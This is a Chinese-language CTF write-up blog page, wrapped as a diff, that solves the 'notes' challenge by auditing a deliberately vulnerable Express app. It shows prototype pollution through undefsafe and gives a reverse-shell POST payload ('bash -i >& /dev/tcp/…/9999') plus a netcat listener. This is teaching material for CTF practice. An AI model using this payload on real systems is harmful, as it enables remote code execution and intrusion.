@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Buuoj|[网鼎杯2020 青龙组]notes | Rinlang</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="0x00 知识点 1.Node.js-express 框架代码审计2.JS 原型链污染  0x01 解题思路  代码审计  题目把源码给出来了,直接可以进行代码审计 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Buuoj|[网鼎杯2020 青龙组]notes">
+<meta property="og:url" content="http://r4u.top/2020/05/22/Buuoj-%E7%BD%91%E9%BC%8E%E6%9D%AF2020-%E9%9D%92%E9%BE%99%E7%BB%84-notes/index.html">
+<meta property="og:site_name" content="Rinlang">
+<meta property="og:description" content="0x00 知识点 1.Node.js-express 框架代码审计2.JS 原型链污染  0x01 解题思路  代码审计  题目把源码给出来了,直接可以进行代码审计 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-05-22T17:47:49.000Z">
+<meta property="article:modified_time" content="2022-01-03T17:17:25.991Z">
+<meta property="article:author" content="Rinlang">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="buuoj">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Rinlang" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Rinlang</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://r4u.top"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-Buuoj-网鼎杯2020-青龙组-notes" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/05/22/Buuoj-%E7%BD%91%E9%BC%8E%E6%9D%AF2020-%E9%9D%92%E9%BE%99%E7%BB%84-notes/" class="article-date">
+  <time class="dt-published" datetime="2020-05-22T17:47:49.000Z" itemprop="datePublished">2020-05-23</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      Buuoj|[网鼎杯2020 青龙组]notes
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<h3 id="0x00-知识点"><a href="#0x00-知识点" class="headerlink" title="0x00 知识点"></a>0x00 知识点</h3></blockquote>
+<p>1.Node.js-express 框架代码审计<br>2.JS 原型链污染</p>
+<blockquote>
+<h3 id="0x01-解题思路"><a href="#0x01-解题思路" class="headerlink" title="0x01 解题思路"></a>0x01 解题思路</h3></blockquote>
+<blockquote>
+<p>代码审计</p>
+</blockquote>
+<p>题目把源码给出来了,直接可以进行代码审计</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line">var express = require(&#x27;express&#x27;);</span><br><span class="line">var path = require(&#x27;path&#x27;);</span><br><span class="line">const undefsafe = require(&#x27;undefsafe&#x27;);</span><br><span class="line">const &#123; exec &#125; = require(&#x27;child_process&#x27;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var app = express();</span><br><span class="line"></span><br><span class="line">class Notes &#123;</span><br><span class="line">    constructor() &#123;</span><br><span class="line">        this.owner = &quot;whoknows&quot;;</span><br><span class="line">        this.num = 0;</span><br><span class="line">        this.note_list = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    write_note(author, raw_note) &#123;</span><br><span class="line">        this.note_list[(this.num++).toString()] = &#123;&quot;author&quot;: author,&quot;raw_note&quot;:raw_note&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    get_note(id) &#123;</span><br><span class="line">        var r = &#123;&#125;</span><br><span class="line">        undefsafe(r, id, undefsafe(this.note_list, id));</span><br><span class="line">        return r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    edit_note(id, author, raw) &#123;</span><br><span class="line">        undefsafe(this.note_list, id + &#x27;.author&#x27;, author);</span><br><span class="line">        undefsafe(this.note_list, id + &#x27;.raw_note&#x27;, raw);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    get_all_notes() &#123;</span><br><span class="line">        return this.note_list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    remove_note(id) &#123;</span><br><span class="line">        delete this.note_list[id];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var notes = new Notes();</span><br><span class="line">notes.write_note(&quot;nobody&quot;, &quot;this is nobody&#x27;s first note&quot;);</span><br><span class="line"></span><br><span class="line">//参数设置</span><br><span class="line">app.set(&#x27;views&#x27;, path.join(__dirname, &#x27;views&#x27;));</span><br><span class="line">app.set(&#x27;view engine&#x27;, &#x27;pug&#x27;);</span><br><span class="line"></span><br><span class="line">//中间件配置</span><br><span class="line">app.use(express.json());</span><br><span class="line">app.use(express.urlencoded(&#123; extended: false &#125;));</span><br><span class="line">app.use(express.static(path.join(__dirname, &#x27;public&#x27;)));</span><br><span class="line"></span><br><span class="line">//路由</span><br><span class="line">app.get(&#x27;/&#x27;, function(req, res, next) &#123;</span><br><span class="line">  res.render(&#x27;index&#x27;, &#123; title: &#x27;Notebook&#x27; &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.route(&#x27;/add_note&#x27;)</span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        res.render(&#x27;mess&#x27;, &#123;message: &#x27;please use POST to add a note&#x27;&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(function(req, res) &#123;</span><br><span class="line">        let author = req.body.author;</span><br><span class="line">        let raw = req.body.raw;</span><br><span class="line">        if (author &amp;&amp; raw) &#123;</span><br><span class="line">            notes.write_note(author, raw);</span><br><span class="line">            res.render(&#x27;mess&#x27;, &#123;message: &quot;add note sucess&quot;&#125;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            res.render(&#x27;mess&#x27;, &#123;message: &quot;did not add note&quot;&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(&#x27;/edit_note&#x27;)</span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        res.render(&#x27;mess&#x27;, &#123;message: &quot;please use POST to edit a note&quot;&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(function(req, res) &#123;</span><br><span class="line">        let id = req.body.id;</span><br><span class="line">        let author = req.body.author;</span><br><span class="line">        let enote = req.body.raw;</span><br><span class="line">        if (id &amp;&amp; author &amp;&amp; enote) &#123;</span><br><span class="line">            notes.edit_note(id, author, enote);</span><br><span class="line">            res.render(&#x27;mess&#x27;, &#123;message: &quot;edit note sucess&quot;&#125;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            res.render(&#x27;mess&#x27;, &#123;message: &quot;edit note failed&quot;&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(&#x27;/delete_note&#x27;)</span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        res.render(&#x27;mess&#x27;, &#123;message: &quot;please use POST to delete a note&quot;&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(function(req, res) &#123;</span><br><span class="line">        let id = req.body.id;</span><br><span class="line">        if (id) &#123;</span><br><span class="line">            notes.remove_note(id);</span><br><span class="line">            res.render(&#x27;mess&#x27;, &#123;message: &quot;delete done&quot;&#125;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            res.render(&#x27;mess&#x27;, &#123;message: &quot;delete failed&quot;&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(&#x27;/notes&#x27;)</span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        let q = req.query.q;</span><br><span class="line">        let a_note;</span><br><span class="line">        if (typeof(q) === &quot;undefined&quot;) &#123;</span><br><span class="line">            a_note = notes.get_all_notes();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            a_note = notes.get_note(q);</span><br><span class="line">        &#125;</span><br><span class="line">        res.render(&#x27;note&#x27;, &#123;list: a_note&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(&#x27;/status&#x27;)</span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        let commands = &#123;</span><br><span class="line">            &quot;script-1&quot;: &quot;uptime&quot;,</span><br><span class="line">            &quot;script-2&quot;: &quot;free -m&quot;</span><br><span class="line">        &#125;;</span><br><span class="line">        for (let index in commands) &#123;   //遍历所有属性,包含对象原型中的属性</span><br><span class="line">            exec(commands[index], &#123;shell:&#x27;/bin/bash&#x27;&#125;, (err, stdout, stderr) =&gt; &#123;</span><br><span class="line">                if (err) &#123;</span><br><span class="line">                    return;</span><br><span class="line">                &#125;</span><br><span class="line">                console.log(`stdout: $&#123;stdout&#125;`);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        res.send(&#x27;OK&#x27;);</span><br><span class="line">        res.end();</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.use(function(req, res, next) &#123;</span><br><span class="line">  res.status(404).send(&#x27;Sorry cant find that!&#x27;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.use(function(err, req, res, next) &#123;</span><br><span class="line">  console.error(err.stack);</span><br><span class="line">  res.status(500).send(&#x27;Something broke!&#x27;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">const port = 8080;</span><br><span class="line">app.listen(port, () =&gt; console.log(`Example app listening at http://localhost:$&#123;port&#125;`))</span><br></pre></td></tr></table></figure>
+
+<p>简单的审计一下,没发现flag相关,但是能够在<code>/tatus</code>路由下发现一个危险的命令执行函数<code>exec()</code>,猜测是达成RCE反弹shell.<br>从<code>exec()</code>的参数来看,是使用<code>for in</code>语句轮流执行<code>commands</code>这个对象中每个属性所包含的字符串命令,而JS的特性for in语句会递归使用参数,即对象原型中的参数也会被使用<br>所以猜测是通过原型链污染的手段在原型对象中添加指令达到RCE的目的,那么接下来的问题变为了怎么造成原型链污染</p>
+<blockquote>
+<p>undefsafe造成的原型链污染</p>
+</blockquote>
+<p>在开头引入了一个<code>undefsafe()</code>函数,主要作用是可以修改对象的深层属性,Useage:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">undefsafe(object, string path, value)</span><br><span class="line">例子:</span><br><span class="line">var object = &#123;</span><br><span class="line">  a: &#123;</span><br><span class="line">    b: [1,2,3]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">var res = undefsafe(object, &#x27;a.b.0&#x27;, 10);</span><br><span class="line">console.log(object); // &#123; a: &#123; b: [10, 2, 3] &#125; &#125;</span><br><span class="line">console.log(res); // 1 - previous value</span><br></pre></td></tr></table></figure>
+<p>猜想可以利用一下,在<code>edit_notes</code>路由中能找到相关的可控参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">edit_note(id, author, raw) &#123;</span><br><span class="line">        undefsafe(this.note_list, id + &#x27;.author&#x27;, author);</span><br><span class="line">        undefsafe(this.note_list, id + &#x27;.raw_note&#x27;, raw);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">app.route(&#x27;/edit_note&#x27;)</span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        res.render(&#x27;mess&#x27;, &#123;message: &quot;please use POST to edit a note&quot;&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(function(req, res) &#123;</span><br><span class="line">        let id = req.body.id;</span><br><span class="line">        let author = req.body.author;</span><br><span class="line">        let enote = req.body.raw;</span><br><span class="line">        if (id &amp;&amp; author &amp;&amp; enote) &#123;</span><br><span class="line">            notes.edit_note(id, author, enote);</span><br><span class="line">            res.render(&#x27;mess&#x27;, &#123;message: &quot;edit note sucess&quot;&#125;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            res.render(&#x27;mess&#x27;, &#123;message: &quot;edit note failed&quot;&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>
+<p>其中参数<code>id``author``raw</code>是我们可控的POST参数,而参数在传入之后会调用对象的方法,进而在方法中调用<code>undefsafe</code>函数,可以考虑<code>undefsafe(object,__proto__,payload)</code>来造成原型链污染</p>
+<blockquote>
+<p>反弹shell</p>
+</blockquote>
+<p>最后只需要访问<code>/status</code>路由完成命令执行反弹shell</p>
+<blockquote>
+<p>POC</p>
+</blockquote>
+<p>首先打开一台公网服务器,用nc监听端口<code>nc -lvvp 9999</code><br>然后POST参数<br><code>id%3d__proto__%26author%3dbash+-i+%3e%26+%2fdev%2ftcp%2f174.1.105.102%2f9999+0%3e%261%26raw%3d123</code><br>因为使用了urlencode中间件,所以需要将参数urlencode一下<br>之后访问<code>/status</code>,命令就会被成功执行,shell被弹到了远程服务器上,在根目录下就能够找到flag</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://r4u.top/2020/05/22/Buuoj-%E7%BD%91%E9%BC%8E%E6%9D%AF2020-%E9%9D%92%E9%BE%99%E7%BB%84-notes/" data-id="ckxyy4hig00058xniblalgovm" data-title="Buuoj|[网鼎杯2020 青龙组]notes" class="article-share-link">分享</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/buuoj/" rel="tag">buuoj</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/08/01/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Egetshell/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">前一篇</strong>
+      <div class="article-nav-title">
+        
+          漏洞复现|Typecho反序列化漏洞getshell
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/04/16/Buuoj-MRCTF2020-Ezpop/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">后一篇</strong>
+      <div class="article-nav-title">Buuoj|[MRCTF2020]Ezpop</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/buuoj/" rel="tag">buuoj</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%B8%AA%E4%BA%BA%E5%BF%83%E5%BE%97/" rel="tag">个人心得</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%80%9D%E8%B7%AF%E5%A4%8D%E7%8E%B0/" rel="tag">思路复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/PHP/" style="font-size: 15px;">PHP</a> <a href="/tags/buuoj/" style="font-size: 20px;">buuoj</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/%E4%B8%AA%E4%BA%BA%E5%BF%83%E5%BE%97/" style="font-size: 10px;">个人心得</a> <a href="/tags/%E6%80%9D%E8%B7%AF%E5%A4%8D%E7%8E%B0/" style="font-size: 10px;">思路复现</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" style="font-size: 10px;">漏洞复现</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">十月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">八月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">五月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">四月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">十二月 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/10/12/%E8%B0%88%E8%B0%88%E5%BF%83%E5%BE%97-%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E6%8C%87%E5%BC%95%E5%8F%8A%E8%B5%84%E6%BA%90%E6%B1%87%E6%80%BB/">谈谈心得|计算机安全学习指引及资源汇总</a>
+          </li>
+        
+          <li>
+            <a href="/2020/08/01/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Egetshell/">漏洞复现|Typecho反序列化漏洞getshell</a>
+          </li>
+        
+          <li>
+            <a href="/2020/05/22/Buuoj-%E7%BD%91%E9%BC%8E%E6%9D%AF2020-%E9%9D%92%E9%BE%99%E7%BB%84-notes/">Buuoj|[网鼎杯2020 青龙组]notes</a>
+          </li>
+        
+          <li>
+            <a href="/2020/04/16/Buuoj-MRCTF2020-Ezpop/">Buuoj|[MRCTF2020]Ezpop</a>
+          </li>
+        
+          <li>
+            <a href="/2020/04/12/%E6%80%9D%E8%B7%AF%E5%A4%8D%E7%8E%B0-%E5%88%A9%E7%94%A8LD-PRELOAD%E8%BF%9B%E8%A1%8C%E5%87%BD%E6%95%B0%E5%8A%AB%E6%8C%81%E7%BB%95%E8%BF%87disable-functions/">思路复现|利用LD_PRELOAD进行函数劫持绕过disable_functions</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2022 Rinlang<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
